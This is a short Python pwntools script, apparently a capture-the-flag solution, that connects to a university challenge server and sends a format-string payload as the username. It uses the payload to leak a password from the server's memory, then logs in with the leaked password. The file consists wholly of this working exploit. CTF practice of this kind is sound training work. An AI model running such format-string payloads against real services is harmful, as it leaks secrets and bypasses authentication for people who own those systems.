from pwn import *

HOST = "cyberchallenge.disi.unitn.it"
PORT = 9200
r = remote(HOST, PORT)


r.sendlineafter(
    b"username: ",
    b"%ld " * 7
)

password = r.recvline().strip().split(b" ")[-1]

log.info(f"Password: {password.decode()}")

r.sendlineafter(
    b"Password: ",
    password
)

print(r.recvall().decode(errors="ignore"))
